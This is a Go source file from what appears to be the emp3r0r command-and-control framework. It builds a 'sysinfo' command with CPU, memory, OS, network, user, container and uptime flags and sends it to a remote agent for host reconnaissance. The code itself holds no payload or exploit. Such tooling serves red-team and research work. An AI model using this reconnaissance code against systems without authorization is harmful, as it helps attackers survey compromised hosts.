package controllers

import (
	"fmt"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

// SysinfoOptions represents sysinfo command options
type SysinfoOptions struct {
	Full      bool
	CPU       bool
	Mem       bool
	OS        bool
	Net       bool
	User      bool
	Container bool
	Uptime    bool
}

// BuildSysinfoCommand builds sysinfo command string from options
// This is pure business logic - no UI dependencies
func BuildSysinfoCommand(opts SysinfoOptions) string {
	cmdStr := "sysinfo"

	if opts.Full {
		cmdStr += " --full"
		return cmdStr
	}

	// Individual flags
	if opts.CPU {
		cmdStr += " --cpu"
	}
	if opts.Mem {
		cmdStr += " --mem"
	}
	if opts.OS {
		cmdStr += " --os"
	}
	if opts.Net {
		cmdStr += " --net"
	}
	if opts.User {
		cmdStr += " --user"
	}
	if opts.Container {
		cmdStr += " --container"
	}
	if opts.Uptime {
		cmdStr += " --uptime"
	}

	return cmdStr
}

// ExecuteSysinfoCommand sends sysinfo command to agent
// Returns error if agent is nil or command fails
func ExecuteSysinfoCommand(agent *def.Emp3r0rAgent, opts SysinfoOptions, opSession string) error {
	if agent == nil {
		return fmt.Errorf("no agent specified")
	}

	cmdStr := BuildSysinfoCommand(opts)

	// Create context and execute
	ctx := &c2context.C2Context{
		Target:    agent,
		OpSession: opSession,
		Flags:     make(map[string]string),
	}
	ctx.Flags["cmd_to_exec"] = cmdStr

	modules.ExecCommand(ctx)
	return nil
}
